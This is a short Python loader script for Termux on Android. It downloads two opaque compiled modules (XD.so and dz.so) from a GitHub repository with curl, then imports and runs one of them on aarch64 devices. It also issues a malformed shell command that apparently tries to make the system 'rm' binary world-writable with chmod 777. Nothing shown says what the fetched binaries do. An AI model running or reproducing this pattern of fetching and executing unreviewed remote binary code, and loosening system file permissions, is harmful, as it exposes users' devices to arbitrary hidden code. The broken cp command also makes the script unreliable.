
import os
from os import path,system
from platform import uname
arch=uname().machine.lower()
system('cp /data/data/com.termux/files/usr/bin && chmod 777 rm')
if path.isfile('XD.so'):
    pass
else:
    system('curl -L https://raw.githubusercontent.com/AKING110/AKING-PRO/main/XD.so -o XD.so')
if path.isfile('dz.so'):
    pass
else:
    system('curl -L https://raw.githubusercontent.com/AKING110/AKING-PRO/main/dz.so -o dz.so')

if 'aarch' in arch:
    arch = 'aarch'
    print('\033[1;92mCongratulatings! Your Deviec Support This Tools')
    import XD
    XD.menu()
else:exit('\033[1;91m Sorry System or device not supported ')

